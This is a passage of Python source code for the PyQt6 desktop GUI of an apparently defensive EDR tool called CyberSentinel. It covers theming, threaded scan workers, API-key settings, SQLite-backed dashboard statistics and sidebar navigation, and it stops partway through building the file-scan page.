# gui.py
#
# CyberSentinel v1 — PyQt6 Desktop GUI
#
# Provides a full graphical interface for all EDR features, replacing the CLI
# for end-user interaction. All scan operations run in QThread workers so the
# interface remains responsive during long-running cloud API calls or ML inference.
#
# Architecture:
#   - Left sidebar navigation with 15 pages
#   - ConsoleWidget: strips ANSI codes, applies color-coded output formatting
#   - GUI callback system: replaces CLI input() prompts with Qt dialogs
#     (quarantine authorization, network isolation, AI report, engine selection)
#   - _run_on_main_signal: thread-safe bridge for dialog creation from worker threads
#
# Pages:
#   Dashboard, Scan File, Scan Hash/IoC, Live EDR, LoLBin Abuse, BYOVD Drivers,
#   Attack Chains, Baseline, Fileless/AMSI, Network, Intel Feeds, Settings,
#   Evaluation, Analyst Feedback, Adaptive Learning

"""
gui.py — CyberSentinel v1 Desktop GUI
Run: python gui.py
Requires: pip install PyQt6
All existing modules (analysis_manager, lolbas_detector, etc.) are imported directly.
Output is streamed to the in-app console panel in real time via QThread workers.
"""

import sys
import re
import os
import sqlite3
import datetime
import threading

# ── Ensure imports resolve from the project root ──────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QFileDialog,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView,
    QSplitter, QFrame, QComboBox, QSpinBox, QGroupBox,
    QMessageBox, QProgressBar, QStackedWidget, QScrollArea,
    QSizePolicy, QDialog, QFormLayout, QDialogButtonBox,
)
from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QSize, QPropertyAnimation,
    QEasingCurve,
)
from PyQt6.QtGui import (
    QFont, QColor, QPalette, QTextCharFormat, QSyntaxHighlighter,
    QIcon, QPixmap, QPainter, QBrush, QLinearGradient,
)


# ══════════════════════════════════════════════════════════════════════════════
#  THEME
# ══════════════════════════════════════════════════════════════════════════════

THEME = {
    "bg":       "#0d1117",
    "surface":  "#161b22",
    "border":   "#30363d",
    "text":     "#c9d1d9",
    "muted":    "#8b949e",
    "red":      "#f85149",
    "green":    "#3fb950",
    "yellow":   "#d29922",
    "blue":     "#58a6ff",
    "purple":   "#bc8cff",
    "red_bg":   "rgba(248,81,73,0.12)",
    "green_bg": "rgba(63,185,80,0.12)",
    "blue_bg":  "rgba(88,166,255,0.12)",
}

BASE_STYLE = f"""
QMainWindow, QWidget {{
    background-color: {THEME['bg']};
    color: {THEME['text']};
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}}
QTabWidget::pane {{
    border: 1px solid {THEME['border']};
    background: {THEME['surface']};
    border-radius: 6px;
}}
QTabBar::tab {{
    background: {THEME['bg']};
    color: {THEME['muted']};
    border: 1px solid {THEME['border']};
    border-bottom: none;
    padding: 7px 16px;
    border-radius: 5px 5px 0 0;
    margin-right: 2px;
    font-size: 11px;
}}
QTabBar::tab:selected {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border-color: {THEME['border']};
}}
QTabBar::tab:hover:!selected {{
    color: {THEME['blue']};
    border-color: {THEME['blue']};
}}
QPushButton {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    padding: 7px 16px;
    border-radius: 5px;
    font-size: 12px;
}}
QPushButton:hover {{
    border-color: {THEME['blue']};
    color: {THEME['blue']};
}}
QPushButton:pressed {{
    background: {THEME['blue_bg']};
}}
QPushButton#danger {{
    color: {THEME['red']};
    border-color: {THEME['red']};
}}
QPushButton#danger:hover {{
    background: {THEME['red_bg']};
}}
QPushButton#success {{
    color: {THEME['green']};
    border-color: {THEME['green']};
}}
QPushButton#success:hover {{
    background: {THEME['green_bg']};
}}
QPushButton#primary {{
    background: {THEME['blue']};
    color: #0d1117;
    border: none;
    font-weight: bold;
}}
QPushButton#primary:hover {{
    background: #79baff;
}}
QLineEdit, QTextEdit, QComboBox, QSpinBox {{
    background: {THEME['bg']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    border-radius: 4px;
    padding: 5px 8px;
    selection-background-color: {THEME['blue']};
}}
QLineEdit:focus, QTextEdit:focus {{
    border-color: {THEME['blue']};
}}
QTableWidget {{
    background: {THEME['surface']};
    color: {THEME['text']};
    border: 1px solid {THEME['border']};
    gridline-color: #2d333b;
    border-radius: 4px;
}}
QTableWidget::item {{
    padding: 5px 10px;
    border-bottom: 1px solid #21262d;
    border-right: 1px solid #21262d;
}}
QTableWidget::item:selected {{
    background: {THEME['blue_bg']};
    color: {THEME['text']};
}}
QHeaderView::section {{
    background: #0d1117;
    color: {THEME['muted']};
    padding: 6px 10px;
    border: none;
    border-bottom: 2px solid {THEME['border']};
    border-right: 1px solid #21262d;
    font-size: 11px;
    font-weight: bold;
}}
QHeaderView::section:last {{
    border-right: none;
}}
QScrollBar:vertical {{
    background: {THEME['bg']};
    width: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:vertical {{
    background: {THEME['border']};
    border-radius: 4px;
    min-height: 20px;
}}
QScrollBar::handle:vertical:hover {{
    background: {THEME['muted']};
}}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QGroupBox {{
    border: 1px solid {THEME['border']};
    border-radius: 6px;
    margin-top: 10px;
    padding-top: 8px;
    color: {THEME['muted']};
    font-size: 11px;
}}
QGroupBox::title {{
    subcontrol-origin: margin;
    left: 10px;
    padding: 0 4px;
}}
QSplitter::handle {{
    background: {THEME['border']};
    width: 1px;
}}
QProgressBar {{
    background: {THEME['bg']};
    border: 1px solid {THEME['border']};
    border-radius: 4px;
    text-align: center;
    color: {THEME['text']};
    height: 6px;
}}
QProgressBar::chunk {{
    background: {THEME['blue']};
    border-radius: 4px;
}}
QLabel#header {{
    color: {THEME['blue']};
    font-size: 18px;
    font-weight: bold;
}}
QLabel#subheader {{
    color: {THEME['muted']};
    font-size: 11px;
}}
"""


# ══════════════════════════════════════════════════════════════════════════════
#  OUTPUT CONSOLE WIDGET  (renders colored EDR output)
# ══════════════════════════════════════════════════════════════════════════════

class ConsoleWidget(QTextEdit):
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setFont(QFont("Consolas", 11))
        self.setStyleSheet(f"""
            QTextEdit {{
                background: #0a0e14;
                color: {THEME['text']};
                border: 1px solid {THEME['border']};
                border-radius: 4px;
                padding: 6px;
            }}
        """)

    # Compiled ANSI escape stripper
    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*[mGKHF]|\x1b\[[0-9;]*m|\033\[[0-9;]*[mGKHF]')

    def append_line(self, text: str, color: str = None):
        # Strip ANSI codes, carriage returns and backspaces (spinner artifacts)
        text = self._ANSI_RE.sub('', text)
        text = text.replace('\r', '').replace('\b', '').rstrip()
        if not text:
            return
        fmt = QTextCharFormat()
        c = color or self._auto_color(text)
        fmt.setForeground(QColor(c))
        cursor = self.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        cursor.insertText(text + "\n", fmt)
        self.setTextCursor(cursor)
        self.ensureCursorVisible()

    def _auto_color(self, text: str) -> str:
        t = text.upper()
        if any(k in t for k in ("MALICIOUS", "CRITICAL", "THREAT", "ERROR", "FAIL", "⚠", "🔴", "[!]")):
            return THEME["red"]
        if any(k in t for k in ("SAFE", "SUCCESS", "CLEAN", "[+]")):
            return THEME["green"]
        if any(k in t for k in ("SUSPICIOUS", "WARNING", "CACHE HIT", "WEBHOOK")):
            return THEME["yellow"]
        if any(k in t for k in ("TIER", "SHA", "TARGET", "INITIALIZ", "[*]")):
            return THEME["blue"]
        return THEME["text"]

    def clear_console(self):
        self.clear()
        self.append_line("─" * 60, THEME["border"])


# ══════════════════════════════════════════════════════════════════════════════
#  STAT CARD WIDGET
# ══════════════════════════════════════════════════════════════════════════════

class StatCard(QFrame):
    def __init__(self, label: str, color: str = None):
        super().__init__()
        self.color = color or THEME["blue"]
        self.setMinimumHeight(64)
        self.setMinimumWidth(100)
        self.setSizePolicy(
            QSizePolicy.Policy.Expanding,
            QSizePolicy.Policy.Preferred
        )
        self.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border: 1px solid {THEME['border']};
                border-radius: 8px;
            }}
        """)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 8, 10, 8)
        layout.setSpacing(2)

        self.value_lbl = QLabel("—")
        self.value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.value_lbl.setFont(QFont("Consolas", 18, QFont.Weight.Bold))
        self.value_lbl.setStyleSheet(f"color: {self.color}; border: none;")

        self.label_lbl = QLabel(label)
        self.label_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label_lbl.setWordWrap(True)
        self.label_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")

        layout.addWidget(self.value_lbl)
        layout.addWidget(self.label_lbl)

    def set_value(self, val):
        self.value_lbl.setText(str(val))


# ══════════════════════════════════════════════════════════════════════════════
#  WORKER THREADS  (run backend ops without freezing the GUI)
# ══════════════════════════════════════════════════════════════════════════════

class OutputCapture:
    """Intercepts print() calls from EDR modules and emits them as Qt signals."""
    def __init__(self, signal):
        self._signal = signal
        self._orig_stdout = sys.stdout

    def write(self, text):
        for line in text.splitlines():
            if line.strip():
                self._signal.emit(line)
        self._orig_stdout.write(text)

    def flush(self):
        self._orig_stdout.flush()


class ScanWorker(QThread):
    line_out  = pyqtSignal(str)
    finished  = pyqtSignal(bool)

    def __init__(self, logic, target: str):
        super().__init__()
        self.logic  = logic
        self.target = target

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            if os.path.isdir(self.target):
                count = 0
                for root, _, files in os.walk(self.target):
                    for f in files:
                        fp = os.path.join(root, f)
                        if fp.lower().endswith((".exe",".dll",".sys",".scr",".cpl",".ocx",".bin",".tmp")):
                            self.logic.scan_file(fp)
                            count += 1
                self.line_out.emit(f"[+] Batch complete — {count} files analyzed.")
            elif os.path.isfile(self.target):
                self.logic.scan_file(self.target)
            else:
                self.line_out.emit(f"[-] Invalid path: {self.target}")
            self.finished.emit(True)
        except Exception as e:
            self.line_out.emit(f"[-] Scan error: {e}")
            self.finished.emit(False)
        finally:
            sys.stdout = cap._orig_stdout


class HashWorker(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(self, logic, hashes: list):
        super().__init__()
        self.logic  = logic
        self.hashes = hashes

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            for h in self.hashes:
                self.logic.scan_hash(h)
            self.finished.emit(True)
        except Exception as e:
            self.line_out.emit(f"[-] Error: {e}")
            self.finished.emit(False)
        finally:
            sys.stdout = cap._orig_stdout


class GenericWorker(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal(object)

    def __init__(self, fn, *args, **kwargs):
        super().__init__()
        self._fn   = fn
        self._args = args
        self._kw   = kwargs

    def run(self):
        cap = OutputCapture(self.line_out)
        sys.stdout = cap
        try:
            result = self._fn(*self._args, **self._kw)
            self.finished.emit(result)
        except Exception as e:
            self.line_out.emit(f"[-] Error: {e}")
            self.finished.emit(None)
        finally:
            sys.stdout = cap._orig_stdout


# ══════════════════════════════════════════════════════════════════════════════
#  SETTINGS DIALOG
# ══════════════════════════════════════════════════════════════════════════════

class SettingsDialog(QDialog):
    def __init__(self, logic, parent=None):
        super().__init__(parent)
        self.logic = logic
        self.setWindowTitle("Configure Cloud Integrations")
        self.setMinimumWidth(480)
        self.setStyleSheet(BASE_STYLE + f"QDialog {{ background: {THEME['surface']}; }}")

        layout = QVBoxLayout(self)
        layout.setSpacing(12)

        title = QLabel("Cloud API Keys & Webhook")
        title.setStyleSheet(f"color: {THEME['blue']}; font-size: 14px; font-weight: bold;")
        layout.addWidget(title)

        note = QLabel("Keys are encrypted with Fernet AES-128 and saved to config.json")
        note.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        layout.addWidget(note)

        form = QFormLayout()
        form.setSpacing(8)

        self.fields = {}
        for key in ("virustotal", "alienvault", "metadefender", "malwarebazaar"):
            le = QLineEdit()
            le.setEchoMode(QLineEdit.EchoMode.Password)
            current = logic.api_keys.get(key, "")
            le.setPlaceholderText("••••••••••••••••" if current else "Not configured")
            le.setText(current)
            self.fields[key] = le
            form.addRow(QLabel(key.capitalize() + ":"), le)

        self.webhook_field = QLineEdit()
        self.webhook_field.setText(logic.webhook_url or "")
        self.webhook_field.setPlaceholderText("https://discord.com/api/webhooks/...")
        form.addRow(QLabel("Webhook URL:"), self.webhook_field)

        layout.addLayout(form)

        btns = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Save |
            QDialogButtonBox.StandardButton.Cancel
        )
        btns.accepted.connect(self.save)
        btns.rejected.connect(self.reject)
        layout.addWidget(btns)

    def save(self):
        from modules import utils
        for key, le in self.fields.items():
            val = le.text().strip()
            if val:
                self.logic.api_keys[key] = val
            else:
                self.logic.api_keys.pop(key, None)
        self.logic.webhook_url = self.webhook_field.text().strip()
        utils.save_config(self.logic.api_keys, self.logic.webhook_url)
        self.accept()


# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE HELPERS  (for live tables)
# ══════════════════════════════════════════════════════════════════════════════

def _db_query(sql, params=()):
    db = os.path.join(BASE_DIR, "threat_cache.db")
    if not os.path.isfile(db):
        return []
    try:
        with sqlite3.connect(db) as c:
            c.row_factory = sqlite3.Row
            return [dict(r) for r in c.execute(sql, params).fetchall()]
    except Exception:
        return []

def _db_count(sql, params=()):
    rows = _db_query(sql, params)
    return rows[0]["c"] if rows else 0


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def verdict_color(v: str) -> str:
    v = (v or "").upper()
    if "MALICIOUS" in v or "CRITICAL" in v: return THEME["red"]
    if "SUSPICIOUS" in v:                   return THEME["yellow"]
    if "SAFE" in v:                         return THEME["green"]
    return THEME["muted"]

def make_table(headers: list, stretch_col: int = -1, wrap_last: bool = False) -> QTableWidget:
    """
    Creates a styled, responsive QTableWidget.

    stretch_col: index of the column that fills remaining space.
    wrap_last:   if True, enables word wrap so the stretch column shows
                 full text across multiple lines (used for Description columns).
    """
    t = QTableWidget(0, len(headers))
    t.setHorizontalHeaderLabels(headers)
    hdr = t.horizontalHeader()
    hdr.setStretchLastSection(False)
    last   = len(headers) - 1
    target = stretch_col if stretch_col >= 0 else last
    for i in range(len(headers)):
        if i == target:
            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.Stretch)
        else:
            hdr.setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
    hdr.setMinimumSectionSize(60)
    t.verticalHeader().setVisible(False)
    t.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
    t.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
    t.setAlternatingRowColors(False)
    t.setShowGrid(True)
    t.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
    # Word wrap only for tables with a long description column —
    # enables multi-line rows so full text is always visible
    t.setWordWrap(wrap_last)
    t.horizontalHeader().setCursor(Qt.CursorShape.SizeHorCursor)
    return t

def table_item(text: str, color: str = None) -> QTableWidgetItem:
    s = str(text or "—")
    item = QTableWidgetItem(s)
    item.setForeground(QColor(color or THEME["text"]))
    # Full text always visible on hover — never loses data to truncation
    item.setToolTip(s)
    return item


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN WINDOW
# ══════════════════════════════════════════════════════════════════════════════

class CyberSentinelGUI(QMainWindow):

    # Signal used to safely run a callable on the Qt main thread
    _run_on_main_signal = pyqtSignal(object)

    def __init__(self):
        super().__init__()
        self._run_on_main_signal.connect(lambda fn: fn())
        self.setWindowTitle("CyberSentinel v1 — EDR Console")
        self.setMinimumSize(900, 600)
        self.setStyleSheet(BASE_STYLE)
        self._workers = []   # keep references so GC doesn't destroy threads

        # Import backend
        try:
            from modules import ScannerLogic, utils as _utils
            from modules.lolbas_detector  import LolbasDetector
            from modules.byovd_detector   import ByovdDetector
            from modules.chain_correlator import ChainCorrelator
            from modules.baseline_engine  import BaselineEngine
            from modules.amsi_monitor     import AmsiMonitor
            from modules.intel_updater    import update_all, feed_status
            from modules.network_isolation import isolate_network, restore_network

            self.logic    = ScannerLogic()
            self.lolbas   = LolbasDetector()
            self.byovd    = ByovdDetector()
            self.correlator = ChainCorrelator()
            self.baseline = BaselineEngine()
            self.amsi     = AmsiMonitor()
            self.update_all   = update_all
            self.feed_status  = feed_status
            self.isolate_net  = isolate_network
            self.restore_net  = restore_network
            self._backend_ok  = True
        except ImportError as e:
            self._backend_ok = False
            self._import_error = str(e)

        self._build_ui()

        # Auto-refresh dashboard stats every 30 s
        self._refresh_timer = QTimer(self)
        self._refresh_timer.timeout.connect(self._refresh_dashboard)
        self._refresh_timer.start(30_000)
        self._refresh_dashboard()

    # ── UI BUILD ──────────────────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Left sidebar navigation
        root.addWidget(self._build_sidebar())

        # Main content area
        self._stack = QStackedWidget()
        root.addWidget(self._stack, 1)

        self._pages = {}
        for name, builder in [
            ("dashboard",  self._build_dashboard_page),
            ("scan_file",  self._build_scan_file_page),
            ("scan_hash",  self._build_scan_hash_page),
            ("live_edr",   self._build_live_edr_page),
            ("lolbas",     self._build_lolbas_page),
            ("byovd",      self._build_byovd_page),
            ("chains",     self._build_chains_page),
            ("baseline",   self._build_baseline_page),
            ("fileless",   self._build_fileless_page),
            ("network",    self._build_network_page),
            ("intel",      self._build_intel_page),
            ("settings",   self._build_settings_page),
            ("evaluation", self._build_evaluation_page),
            ("feedback",   self._build_feedback_page),
            ("adaptive",   self._build_adaptive_page),
            ("explainability", self._build_explainability_page),
            ("risk_scores",    self._build_risk_scores_page),
            ("drift",          self._build_drift_page),
        ]:
            page = builder()
            self._pages[name] = self._stack.addWidget(page)

        if not self._backend_ok:
            self._show_page("dashboard")

    def _build_sidebar(self):
        sidebar = QFrame()
        sidebar.setMinimumWidth(170)
        sidebar.setMaximumWidth(220)
        sidebar.setSizePolicy(
            QSizePolicy.Policy.Fixed,
            QSizePolicy.Policy.Expanding
        )
        sidebar.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border-right: 1px solid {THEME['border']};
            }}
        """)
        layout = QVBoxLayout(sidebar)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Logo
        logo_frame = QFrame()
        logo_frame.setStyleSheet(f"border-bottom: 1px solid {THEME['border']};")
        logo_layout = QVBoxLayout(logo_frame)
        logo_layout.setContentsMargins(16, 16, 16, 16)
        logo_layout.setSpacing(2)

        icon_lbl = QLabel("🛡️")
        icon_lbl.setFont(QFont("Segoe UI Emoji", 22))
        icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        icon_lbl.setStyleSheet("border: none;")

        title_lbl = QLabel("CyberSentinel")
        title_lbl.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
        title_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_lbl.setStyleSheet(f"color: {THEME['blue']}; border: none;")

        ver_lbl = QLabel("v1 — EDR Console")
        ver_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        ver_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")

        logo_layout.addWidget(icon_lbl)
        logo_layout.addWidget(title_lbl)
        logo_layout.addWidget(ver_lbl)
        layout.addWidget(logo_frame)

        # Nav buttons
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setStyleSheet("border: none; background: transparent;")

        nav_widget = QWidget()
        nav_layout = QVBoxLayout(nav_widget)
        nav_layout.setContentsMargins(8, 8, 8, 8)
        nav_layout.setSpacing(2)
        nav_widget.setStyleSheet("background: transparent;")

        sections = [
            ("", []),
            ("OVERVIEW", [
                ("📊  Dashboard",       "dashboard"),
            ]),
            ("CORE SCANNING", [
                ("🔍  Scan File",        "scan_file"),
                ("🔑  Scan Hash / IoC", "scan_hash"),
                ("⚡  Live EDR",         "live_edr"),
            ]),
            ("DETECTORS", [
                ("🪝  LoLBin Abuse",    "lolbas"),
                ("💀  BYOVD Drivers",   "byovd"),
                ("🔗  Attack Chains",   "chains"),
                ("📐  Baseline",        "baseline"),
                ("👻  Fileless / AMSI", "fileless"),
            ]),
            ("MANAGEMENT", [
                ("🌐  Network",         "network"),
                ("📡  Intel Feeds",     "intel"),
                ("⚙️  Settings",          "settings"),
                ("📈  Evaluation",        "evaluation"),
                ("📝  Analyst Feedback",  "feedback"),
                ("🧠  Adaptive Learning", "adaptive"),
                ("🔍  Explainability",    "explainability"),
                ("⚡  Risk Scores",       "risk_scores"),
                ("📉  Drift Monitor",     "drift"),
            ]),
        ]

        self._nav_buttons = {}
        for section_title, items in sections:
            if section_title:
                lbl = QLabel(section_title)
                lbl.setStyleSheet(f"""
                    color: {THEME['muted']};
                    font-size: 9px;
                    font-weight: bold;
                    padding: 10px 8px 4px 8px;
                    background: transparent;
                """)
                nav_layout.addWidget(lbl)

            for btn_text, page_name in items:
                btn = QPushButton(btn_text)
                btn.setObjectName(f"nav_{page_name}")
                btn.setStyleSheet(self._nav_style(False))
                btn.clicked.connect(lambda checked, p=page_name: self._show_page(p))
                nav_layout.addWidget(btn)
                self._nav_buttons[page_name] = btn

        nav_layout.addStretch()
        scroll.setWidget(nav_widget)
        layout.addWidget(scroll, 1)

        # Bottom status
        self._status_bar = QLabel("● Ready")
        self._status_bar.setStyleSheet(f"""
            color: {THEME['green']};
            font-size: 10px;
            padding: 8px 14px;
            border-top: 1px solid {THEME['border']};
            background: transparent;
        """)
        layout.addWidget(self._status_bar)

        return sidebar

    def _nav_style(self, active: bool) -> str:
        if active:
            return f"""
                QPushButton {{
                    background: {THEME['blue_bg']};
                    color: {THEME['blue']};
                    border: 1px solid {THEME['blue']};
                    border-radius: 5px;
                    padding: 8px 12px;
                    text-align: left;
                    font-size: 12px;
                }}
            """
        return f"""
            QPushButton {{
                background: transparent;
                color: {THEME['muted']};
                border: 1px solid transparent;
                border-radius: 5px;
                padding: 8px 12px;
                text-align: left;
                font-size: 12px;
            }}
            QPushButton:hover {{
                background: rgba(88,166,255,0.06);
                color: {THEME['text']};
                border-color: {THEME['border']};
            }}
        """

    def _show_page(self, name: str):
        if name in self._pages:
            self._stack.setCurrentIndex(self._pages[name])
        for pname, btn in self._nav_buttons.items():
            btn.setStyleSheet(self._nav_style(pname == name))
        if name == "dashboard":
            self._refresh_dashboard()
        elif name == "chains":
            self._refresh_chains()
        elif name == "fileless":
            self._refresh_fileless()
        elif name == "feedback":
            self._refresh_feedback_table()

    # ── PAGE: HEADER HELPER ───────────────────────────────────────────────────

    def _page_header(self, icon: str, title: str, subtitle: str):
        frame = QFrame()
        frame.setStyleSheet(f"""
            QFrame {{
                background: {THEME['surface']};
                border-bottom: 1px solid {THEME['border']};
                border-radius: 0;
            }}
        """)
        h = QHBoxLayout(frame)
        h.setContentsMargins(24, 14, 24, 14)
        h.setSpacing(12)

        icon_lbl = QLabel(icon)
        icon_lbl.setFont(QFont("Segoe UI Emoji", 20))
        icon_lbl.setStyleSheet("border: none;")
        icon_lbl.setSizePolicy(
            QSizePolicy.Policy.Fixed,
            QSizePolicy.Policy.Preferred
        )

        txt = QVBoxLayout()
        txt.setSpacing(2)
        t = QLabel(title)
        t.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        t.setStyleSheet(f"color: {THEME['blue']}; border: none;")

        s = QLabel(subtitle)
        s.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px; border: none;")
        s.setWordWrap(True)     # Prevents subtitle from being clipped on narrow windows
        s.setSizePolicy(
            QSizePolicy.Policy.Expanding,
            QSizePolicy.Policy.Preferred
        )

        txt.addWidget(t)
        txt.addWidget(s)

        h.addWidget(icon_lbl)
        h.addLayout(txt, 1)    # Give text column stretch factor so it fills available width
        # Remove fixed height — let content determine height so subtitles never clip
        frame.setMinimumHeight(60)
        return frame

    # ── PAGE: CONSOLE PANE HELPER ─────────────────────────────────────────────

    def _with_console(self, top_widget, console_attr: str):
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(top_widget)
        console = ConsoleWidget()
        console.append_line("● Console ready.", THEME["muted"])
        setattr(self, console_attr, console)
        splitter.addWidget(console)
        splitter.setSizes([400, 200])
        return splitter

    # ── PAGE: DASHBOARD ───────────────────────────────────────────────────────

    def _build_dashboard_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        layout.addWidget(self._page_header(
            "📊", "SOC Dashboard",
            "Live threat statistics — auto-refreshes every 30 seconds"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        # Stats row
        stats_row = QHBoxLayout()
        stats_row.setSpacing(12)
        self._stat_cards = {}
        for label, key, color in [
            ("Total Scans",     "total",    THEME["blue"]),
            ("Malicious",       "mal",      THEME["red"]),
            ("Safe",            "safe",     THEME["green"]),
            ("False Positives", "fp",       THEME["yellow"]),
            ("Chain Alerts",    "chains",   THEME["red"]),
            ("BYOVD Alerts",    "byovd",    THEME["red"]),
            ("Fileless Alerts", "fileless", THEME["purple"]),
        ]:
            card = StatCard(label, color)
            self._stat_cards[key] = card
            stats_row.addWidget(card)
        inner_layout.addLayout(stats_row)

        # Refresh button
        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh Now")
        refresh_btn.setObjectName("primary")
        refresh_btn.setMinimumWidth(140)
        refresh_btn.clicked.connect(self._refresh_dashboard)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()

        self._db_path_lbl = QLabel()
        self._db_path_lbl.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        btn_row.addWidget(self._db_path_lbl)
        inner_layout.addLayout(btn_row)

        # Recent scans table
        grp = QGroupBox("Recent Scan History")
        grp_layout = QVBoxLayout(grp)
        self._dash_table = make_table(["Timestamp", "File", "SHA-256", "Verdict"], stretch_col=1)
        grp_layout.addWidget(self._dash_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_dashboard(self):
        db = os.path.join(BASE_DIR, "threat_cache.db")
        self._db_path_lbl.setText(f"DB: {db}  |  Exists: {'✓' if os.path.isfile(db) else '✗'}")

        counts = {
            "total":    _db_count("SELECT COUNT(*) c FROM scan_cache"),
            "mal":      _db_count("SELECT COUNT(*) c FROM scan_cache WHERE verdict LIKE '%MALICIOUS%' OR verdict LIKE '%CRITICAL%'"),
            "safe":     _db_count("SELECT COUNT(*) c FROM scan_cache WHERE verdict='SAFE'"),
            "fp":       _db_count("SELECT COUNT(*) c FROM analyst_feedback WHERE analyst_verdict='FALSE_POSITIVE'"),
            "chains":   _db_count("SELECT COUNT(*) c FROM chain_alerts"),
            "byovd":    _db_count("SELECT COUNT(*) c FROM driver_alerts"),
            "fileless": _db_count("SELECT COUNT(*) c FROM fileless_alerts"),
        }
        for key, card in self._stat_cards.items():
            card.set_value(counts.get(key, 0))

        rows = _db_query(
            "SELECT sha256, filename, verdict, timestamp FROM scan_cache ORDER BY timestamp DESC LIMIT 100"
        )
        t = self._dash_table
        t.setRowCount(0)
        for r in rows:
            row = t.rowCount()
            t.insertRow(row)
            t.setItem(row, 0, table_item(r.get("timestamp", "")))
            t.setItem(row, 1, table_item(r.get("filename", "—")))
            t.setItem(row, 2, table_item(r.get("sha256") or ""))
            v = r.get("verdict", "")
            t.setItem(row, 3, table_item(v, verdict_color(v)))

    # ── PAGE: SCAN FILE ───────────────────────────────────────────────────────

    def _build_scan_file_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔍", "Scan File or Directory",
            "Tier 1 Cloud + Tier 2 ML + Tier 3 AI — full pipeline"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        # Path input row
        path_grp = QGroupBox("Target")
        path_layout = QHBoxLayout(path_grp)
        self._scan_path = QLineEdit()
        self._scan_path.setPlaceholderText("Enter file or folder path, or click Browse…")
        browse_btn = QPushButton("📂  Browse")
        browse_btn.setMinimumWidth(110)
        browse_btn.clicked.connect(self._browse_scan_file)
        browse_dir_btn = QPushButton("📁  Folder")
        browse_dir_btn.setMinimumWidth(90)
        browse_dir_btn.clicked.connect(self._browse_scan_dir)
        path_layout.addWidget(self._scan_path)
        path_layout.addWidget(browse_btn)
        path_layout.addWidget(browse_dir_btn)
        inner_layout.addWidget(path_grp)

        # Options row
        opts_row = QHBoxLayout()
        engine_grp = QGroupBox("Cloud Engine")
        engine_layout = QHBoxLayout(engine_grp)
        self._scan_engine_combo = QComboBox()
        self._scan_engine_combo.addItems([
            "Smart Consensus (all APIs)",
            "VirusTotal only",
            "AlienVault OTX only",
            "MetaDefender only",
            "MalwareBazaar only",
        ])
        engine_layout.addWidget(self._scan_engine_combo)
        opts_row.addWidget(engine_grp)
        opts_row.addStretch()

        self._scan_file_btn = QPushButton("  ▶  Run Scan")
        self._scan_file_btn.setObjectName("primary")
        self._scan_file_btn.setMinimumWidth(130)
        self._scan_file_btn.clicked.connect(self._run_scan_file)
        opts_row.addWidget(self._scan_file_btn)

